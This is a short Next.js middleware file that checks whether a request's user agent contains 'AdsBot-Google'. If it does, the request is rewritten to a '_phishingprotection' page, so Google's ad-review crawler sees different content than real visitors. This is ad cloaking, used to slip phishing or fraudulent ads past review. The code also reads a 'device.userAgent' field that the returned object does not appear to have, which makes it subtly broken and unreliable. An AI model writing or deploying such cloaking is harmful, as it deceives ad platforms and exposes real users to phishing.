import { NextRequest, NextResponse, userAgent } from 'next/server'

// Set pathname were middleware will be executed
export const config = {
  matcher: '*',
}

export function middleware(req: NextRequest) {
  // Parse user agent
  const { device } = userAgent(req)

	if (device.userAgent.includes('AdsBot-Google')) {

		// Update the expected url
		req.nextUrl.pathname = `_phishingprotection/index.html`

		// Return rewrited response
		return NextResponse.rewrite(req.nextUrl)

	}
}
